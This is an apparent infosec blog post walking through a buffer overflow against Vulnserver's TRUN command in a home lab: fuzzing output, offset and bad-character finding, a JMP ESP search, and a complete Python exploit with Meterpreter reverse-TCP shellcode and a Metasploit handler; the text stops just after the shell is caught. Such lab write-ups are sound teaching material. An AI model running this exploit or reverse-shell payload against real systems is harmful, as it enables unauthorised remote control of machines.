<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><head><script defer data-domain="c2.quest" src="https://plausible.io/js/plausible.js"></script><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Vulnserver-Trun" /><meta name="author" content="Mojo" /><meta property="og:locale" content="en_US" /><meta name="description" content="Just another Infosec blog :p" /><meta property="og:description" content="Just another Infosec blog :p" /><link rel="canonical" href="https://c2.quest/archived/2020-01-30-trun.html" /><meta property="og:url" content="https://c2.quest/archived/2020-01-30-trun.html" /><meta property="og:site_name" content="Mojodojo’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-01-30T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vulnserver-Trun" /><meta name="twitter:site" content="@Mojodojo_101" /><meta name="twitter:creator" content="@Mojo" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mojo"},"dateModified":"2020-01-30T00:00:00+01:00","datePublished":"2020-01-30T00:00:00+01:00","description":"Just another Infosec blog :p","headline":"Vulnserver-Trun","mainEntityOfPage":{"@type":"WebPage","@id":"https://c2.quest/archived/2020-01-30-trun.html"},"url":"https://c2.quest/archived/2020-01-30-trun.html"}</script><title>Vulnserver-Trun | Mojodojo's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.jpg"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mojodojo's Blog"><meta name="application-name" content="Mojodojo's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LTMTPRJBM7"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LTMTPRJBM7'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/mojodojo101_avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mojodojo's Blog</a></div><div class="site-subtitle font-italic"><a href="https://discord.gg/infosecprep" target="_blank" rel="noopener noreferrer">discord.gg/infosecprep</a></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/mojodojo101" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Mojodojo_101" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cnn.mr.hide','googlemail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/archived"> Archived </a> </span> <span>Vulnserver-Trun</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Vulnserver-Trun</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mojo </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jan 30, 2020, 12:00 AM +0000" prep="on" > Jan 30, 2020 <i class="unloaded">2020-01-30T00:00:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1049 words">5 min</span></div></div><div class="post-content"><h1 id="-trun-">** TRUN **</h1><p>This is probably the best place to start on vulnserver. The function is straight forward once you know what triggers the BOF.</p><p>I read vulnserver.c but you can also fuzz for these with tools like <a href="https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE">spike</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-trigger.PNG" alt="trun-trigger" /></p><h5 id="-is-apparently-the-trigger">”.” is apparently the trigger</h5><p>Using my little <a href="https://gist.github.com/mojodojo101/9df5012a0928f824d158e50d91305435">fuzz script</a> i was able to find a break point quickly</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-h</span>
usage: fuzzer.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="nt">-f</span> FUNC_TO_FUZZ <span class="nt">-l</span> LENGTH_OF_BUFFER <span class="nt">-i</span> IP <span class="nt">-p</span> PORT
                 <span class="o">[</span><span class="nt">-b</span> BAD_CHARS]
                 <span class="o">{</span>func<span class="o">}</span> ...

bof-exploit

positional arguments:
  <span class="o">{</span>func<span class="o">}</span>               func <span class="o">[</span><span class="s1">'fuzzbc'</span>, <span class="s1">'testeip'</span>, <span class="s1">'fuzzbp'</span><span class="o">]</span>

optional arguments:
  <span class="nt">-h</span>, <span class="nt">--help</span>           show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-f</span> FUNC_TO_FUZZ      <span class="k">function </span>to fuzz <span class="k">for </span>example <span class="s2">"HELLO "</span>
  <span class="nt">-l</span> LENGTH_OF_BUFFER  length of buffer
  <span class="nt">-i</span> IP                ip
  <span class="nt">-p</span> PORT              port
  <span class="nt">-b</span> BAD_CHARS         bad chars <span class="k">for </span>example <span class="s2">"0x10,0x0a,0x0d"</span>
</pre></table></code></div></div><p>Lets send our first payload. Using the function fuzzbp (Fuzz breaking point). And specifying a -f for which function to fuzz on the server. In this case we want to fuzz “TRUN .”</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 4000 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func fuzzbp 
send payload to 192.168.138.139:9999 with total length of 4000 <span class="nb">.</span>
 the last 20 bytes of the buffer are:
 41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:0d:0a
</pre></table></code></div></div><p>This crashed the Server with a bunch of “A”’s <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-crash-1.PNG" alt="crash-1" /></p><p>Like a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary-search-algorithm</a> i will just cut the length of our buffer in half now to home in on the crashing point.</p><p>We can quickly restart the server by pressing F3, selecting the correct binary and pressing 2 times F9.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>    root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 4000 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func fuzzbp 
^CTraceback <span class="o">(</span>most recent call last<span class="o">)</span>: 
  File <span class="s2">"fuzzer.py"</span>, line 120, <span class="k">in</span> &lt;module&gt;                   
    FUNCTION_MAP[args.func]<span class="o">(</span>args.func_to_fuzz,args.length_of_buffer,[args.bad_chars],args.ip,args.port<span class="o">)</span>     
  File <span class="s2">"fuzzer.py"</span>, line 62, <span class="k">in </span>fuzzBreakPoint                  
    sendPayload<span class="o">(</span>buffer,ip,port<span class="o">)</span>      
  File <span class="s2">"fuzzer.py"</span>, line 40, <span class="k">in </span>sendPayload                 
    s.recv<span class="o">(</span>1024<span class="o">)</span>                                                                                                                                            
KeyboardInterrupt                                                             
root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 2000 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func fuzzbp 
send payload to 192.168.138.139:9999 with total length of 2000 <span class="nb">.</span>
 the last 20 bytes of the buffer are:                                                                                                                       
 41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:0d:0a    
root@kali:~/redteam/vulnserver#      
root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 3000 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func fuzzbp 
send payload to 192.168.138.139:9999 with total length of 3000 <span class="nb">.</span>                                                                                            
 the last 20 bytes of the buffer are:                                         
 41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:0d:0a
root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 2500 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func fuzzbp
...

</pre></table></code></div></div><p>Eventually we will find the last offset where we dont stop the programs execution is at 2006 bytes.</p><p>Now we can start looking for <a href="http://unixwiz.net/techtips/win32-callconv-asm.html">EIP</a> using -f testeip</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 2018 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func testeip
send payload to 192.168.138.139:9999 with total length of 2018 <span class="nb">.</span>
 the last 20 bytes of the buffer are:
 41:41:41:41:41:41:42:42:42:42:43:43:43:43:44:44:44:44:0d:0a
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-crash-1.PNG" alt="trun-crash-2" /></p><p>We overwrote EIP with 4* 0x44 which corresponds to the bytes 2013-2016 since the last two bytes are our \r\n.</p><p>Now we should check for bad chars by using the -f fuzzbc (Fuzz bad characters) function.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@kali:~/redteam/vulnserver# python fuzzer.py <span class="nt">-f</span> <span class="s2">"TRUN ."</span> <span class="nt">-l</span> 2018 <span class="nt">-i</span> 192.168.138.139 <span class="nt">-p</span> 9999 func fuzzbc
send payload to 192.168.138.139:9999 with total length of 2274 <span class="nb">.</span>
 the last 20 bytes of the buffer are:
 ee:ef:f0:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:fb:fc:fd:fe:ff:0d:0a
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-bc-1.PNG" alt="trun-bc-1" /></p><p>The first byte in our bad chars fuzz buffer “0x00” stopped the server from receiving more information. We add the -b “0x00” flag to blacklist that byte.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python fuzzer.py -f "TRUN ." -l 2018 -i 192.168.138.139 -p 9999 -b "0x00" func fuzzbc
</pre></table></code></div></div><p>Now it seems like the fuzzing chars all went through</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-gc-1.PNG" alt="trun-gc-1" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-gc-2.PNG" alt="trun-gc-2" /></p><p>We can check this by subtracting the amount of bad chars we removed from our 256-char buffer. We only removed 1 char so our buffer should be 255 bytes long. And indeed our buffer stops exactly at 0x23dfadf.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>     <span class="nb">printf</span> <span class="s2">"%x"</span> <span class="k">$((</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">$((</span><span class="m">0</span>x023DF9E0<span class="k">))</span><span class="si">)</span><span class="o">+</span><span class="m">255</span><span class="k">))</span>
     23dfadf
</pre></table></code></div></div><p>Search for a gadget that lets us jump to our shellcode. Since i turned DEP and ASLR off for this exercise we can just search for a JMP ESP statement. Using msf-nasm-shell or my personal favorite rasm2 we can find the right opcode for this.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>    rasm2 <span class="nt">-a</span> x86 <span class="nt">-b</span> 32  <span class="s2">"jmp esp"</span>
    <span class="c">#returns ffe4</span>
</pre></table></code></div></div><p>Use “!mona modules” in Immunity-debugger-console to find modules which have little protection. vulnserver.exe and essfunc.dll seem like a good source of gadgets.</p><pre><code class="language-cmd">    !mona modules
</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-mona-modules.PNG" alt="mona-modules" /></p><p>Search for our jmp esp in the modules.</p><pre><code class="language-cmd">    !mona find -s "\xff\xe4" -m essfunc.dll
</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/pictures/bofs/vulnserver/trun-mona-jmp-esp.PNG" alt="mona-jmp-esp" /></p><p>Great 0x625011af seems like a good choice for our exploit since it does not contain any bad chars (“0x00”). This means we have all the pieces to craft our script.</p><p>To recap we need;</p><ol><li>“Trun .” to trigger the exploit. (total length 6)<li>2006 bytes of random chars which are not 0s (total length 2012)<li>EIP, which will be 0x625011af reversed since windows uses little endian for everything but Networking -&gt; 0xaf115062<li>Some NOP aka 0x90 to give our exploit space on the stack</ol><h4 id="the-final-exploit">The final exploit:</h4><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">sys</span><span class="p">,</span><span class="n">socket</span>
<span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">192.168.138.139</span><span class="sh">"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="c1">#msfvenom -p windows/meterpreter/reverse_tcp -f python LHOST=192.168.138.138 LPORT=443 &gt; shellcode
</span>
<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd9\xc3\xb8\x0a\xe4\xfe\x67\xd9\x74\x24\xf4\x5f\x33</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\xb1\x56\x83\xef\xfc\x31\x47\x14\x03\x47\x1e\x06</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x0b\x9b\xf6\x44\xf4\x64\x06\x29\x7c\x81\x37\x69\x1a</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc1\x67\x59\x68\x87\x8b\x12\x3c\x3c\x18\x56\xe9\x33</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa9\xdd\xcf\x7a\x2a\x4d\x33\x1c\xa8\x8c\x60\xfe\x91</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5e\x75\xff\xd6\x83\x74\xad\x8f\xc8\x2b\x42\xa4\x85</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf7\xe9\xf6\x08\x70\x0d\x4e\x2a\x51\x80\xc5\x75\x71</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x22\x0a\x0e\x38\x3c\x4f\x2b\xf2\xb7\xbb\xc7\x05\x1e</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf2\x28\xa9\x5f\x3b\xdb\xb3\x98\xfb\x04\xc6\xd0\xf8</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb9\xd1\x26\x83\x65\x57\xbd\x23\xed\xcf\x19\xd2\x22</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x89\xea\xd8\x8f\xdd\xb5\xfc\x0e\x31\xce\xf8\x9b\xb4</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x01\x89\xd8\x92\x85\xd2\xbb\xbb\x9c\xbe\x6a\xc3\xff</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x61\xd2\x61\x8b\x8f\x07\x18\xd6\xc7\xe4\x11\xe9\x17</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x63\x21\x9a\x25\x2c\x99\x34\x05\xa5\x07\xc2\x1c\xa1</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb7\x1c\xa6\xa2\x49\x9d\xd6\xeb\x8d\xc9\x86\x83\x24</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x72\x4d\x54\xc8\xa7\xfb\x5e\x5e\x88\x53\xd4\x14\x60</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa1\xe9\x29\xca\x2c\x0f\x79\x7c\x7e\x80\x3a\x2c\x3e</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x70\xd3\x26\xb1\xaf\xc3\x48\x18\xd8\x6e\xa7\xf4\xb0</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x06\x5e\x5d\x4a\xb6\x9f\x48\x36\xf8\x14\x78\xc6\xb7</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xdc\x09\xd4\xa0\xba\xf1\x24\x31\x2f\xf1\x4e\x35\xf9</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa6\xe6\x37\xdc\x80\xa8\xc8\x0b\x93\xaf\x37\xca\xa5</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc4\x0e\x58\x89\xb2\x6e\x8c\x09\x43\x39\xc6\x09\x2b</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x9d\xb2\x5a\x4e\xe2\x6e\xcf\xc3\x77\x91\xb9\xb0\xd0</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf9\x47\xee\x17\xa6\xb8\xc5\x2b\xa1\x46\x9b\x03\x0a</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x2e\x63\x14\xaa\xae\x09\x94\xfa\xc6\xc6\xbb\xf5\x26</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x26\x16\x5e\x2e\xad\xf7\x2c\xcf\xb2\xdd\xf1\x51\xb2</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd2\x29\x62\xc9\x9b\xce\x83\x2e\xb2\xaa\x84\x2e\xba</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xcc\xb9\xf8\x83\xba\xfc\x38\xb0\xb5\x4b\x1c\x91\x5f</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb3\x32\xe1\x75</span><span class="sh">"</span>
<span class="c1">#addr of JMP ESP = 0x625011af
</span><span class="n">exploitbuffer</span><span class="o">=</span><span class="sh">"</span><span class="s">TRUN .</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">2006</span><span class="o">+</span><span class="sh">"</span><span class="se">\xaf\x11\x50\x62</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="n">buf</span><span class="o">+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">exploitbuffer</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div><p>Now to run the exploit:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    msfconsole
    use exploit/multi/handler
    <span class="nb">set </span>lhost 127.0.0.1
    <span class="nb">set </span>lport 443
    run
</pre></table></code></div></div><p>and in another terminal</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>    python exploit.py
</pre></table></code></div></div><p>And we get a nice shell back</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
